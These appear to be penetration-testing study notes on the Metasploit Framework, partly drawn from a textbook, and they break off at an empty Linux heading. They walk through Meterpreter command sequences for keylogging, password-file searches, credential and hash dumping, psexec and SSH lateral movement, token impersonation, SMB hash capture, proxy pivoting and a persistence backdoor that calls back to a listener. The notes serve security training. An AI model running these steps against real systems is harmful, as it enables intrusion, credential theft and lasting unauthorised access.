
## Introduction

The Metasploit Framework (MSF) is far more than just a collection of exploits–it is also a solid foundation that you can build upon and easily customize to meet your needs.

### Architecture

#### Directories

Within Kali, Metasploit is installed in the /usr/share/metasploit-framework directory

- **/usr/share/metasploit-framework/data/**: Contains editable files used by Metasploit to store binaries required for certain exploits, wordlists, images,...
- **/usr/share/metasploit-framework/documentation/**: Contains the available documentation for the framework.
- **/usr/share/metasploit-framework/lib/**: Contains the heart of the framework code base
- **/usr/share/metasploit-framework/modules/**: Contains the modules for exploits, auxiliary and post modules, payloads, encoders, and nop generators.
- **/usr/share/metasploit-framework/plugins/**: Contains the plugins you may use with metasploit

#### Modules

msfconsole
> **msf >** info module
> **msf exploit(xxxx)>** show options
> **msf exploit(xxxx)>** show advanced

Metasploit gives you the option to load modules after msfconsole has already been started.

> msf > loadpath /usr/share/metasploit-framework/modules/



> show targets
> set target 0


###

msfencode -l


### Information Gathering

#### Searching Interesting Files

We can search for files that contains the word *password* in it.
> meterpreter > search -f *password*

#### Keylogger

Within metasploit, there is a keylogger, we can start the keylogger by executing the following command

> meterpreter > keyscan_start

Then, after some time, we can dump the output.

> meterpreter > keyscan_dump

#### Gathering module

Within */usr/share/metasploit-framework/modules/post/windows/gather/credentials*, there are a lot of modules that can be used to gather credentials

msf > use post/windows/gather/credentials/winscp

### Lateral Movement

exploit/windows/smb/psexec

> **msf >** use exploit/windows/smb/psexec
> **msf exploit(psexec) >** set RHOST 192.168.20.10
> **msf exploit(psexec) >** set SMBUser georgia
> **msf exploit(psexec) >** set SMBPass password
> **msf exploit(psexec) >** exploit


The PSExec technique originated in the Sysinternals Windows management tool set in the late 1990s. The utility worked by using valid credentials
to connect to the ADMIN$ share on the Windows XP SMB server. PSExec
uploads a Windows service executable to the ADMIN$ share and then connects to the Windows Service Control Manager using remote procedure
call (RPC) to start the executable service



meterpreter > shell
meterpreter > hashdump


When using the hashdump Meterpreter command against newer Windows operating
systems, you may find that it fails. An alternative is the post module: post/windows/
gather/hashdump.

msf > use exploit/windows/smb/psexec

Like PSExec for Windows, we can use SSHExec to move through an environment’s Linux systems if we have even one set of valid credentials, which
are likely to work elsewhere in the environment. 

### SSHexec

msf > use exploit/multi/ssh/sshexec

We’re on a compromised system: our Windows XP target. Which tokens are
on the system, and how do we steal them? Incognito was originally a standalone tool developed by security researchers conducting research into using
token stealing for privilege escalation, but it has since been added as an
extension to Meterpreter. 

### Incognito

Incognito is not loaded into Meterpreter by default, but we can add it
with the load command, as shown here.

meterpreter > load incognito
meterpreter > use incognito
meterpreter > list_tokens -u

meterpreter > impersonate_token BOOKXP\\secret


https://gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/

As we list tokens, Incognito
searches all handles on the system to determine which ones belong to tokens
using low-level Windows API calls.

We see tokens for both georgia and secret. Let’s try stealing secret’s
delegation token, effectively gaining the privileges of this user. Use the
impersonate_token command to steal the token, as shown in Listing 13-26.
(Note that we use two backslashes to escape the backslash between the
domain—in this case, the local machine name—and the username.)
meterpreter > impersonate_token BOOKXP\\secret


### SMB

msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /root/johnfile





using the ProxyChains tool (which
redirects traffic to proxy servers) to send our traffic from other Kali tools
through Metasploit.

msf > use auxiliary/server/socks4a 



socks4 127.0.0.1 1080
proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190

### Persistencce

The Meterpreter script **persistence** automates the creation of a Windows backdoor that will automatically connect back to a Metasploit listener at startup, login, and so on, based on the options we use when creating it

> meterpreter > run persistence -h

#### Windows

- **-U**: Automatically start the agent when the User logs on

> meterpreter > run persistence -r 192.168.20.9 -p 2345 -U

#### Linux

